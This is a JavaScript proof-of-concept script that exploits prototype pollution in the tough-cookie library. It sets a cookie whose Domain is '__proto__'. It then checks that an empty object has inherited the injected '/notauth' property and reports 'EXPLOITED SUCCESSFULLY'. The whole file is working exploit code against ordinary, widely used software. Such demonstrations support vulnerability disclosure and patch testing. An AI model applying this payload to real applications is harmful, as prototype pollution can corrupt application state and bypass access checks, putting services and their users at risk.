async function main() {
    try {
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });
        // Normal cookie
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Auth=Lol; Domain=google.com; Path=/notauth",
                "https://google.com/",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });
        // Exploit cookie
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Slonser=polluted; Domain=__proto__; Path=/notauth",
                "https://__proto__/admin",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        // Testing exploit cookie
        var a = {};
        console.log(a["/notauth"]["Slonser"]);
        console.log("EXPLOITED SUCCESSFULLY");
    } catch (error) {
        console.error("Error:", error);
        console.log("EXPLOIT FAILED");
    }
}

main();
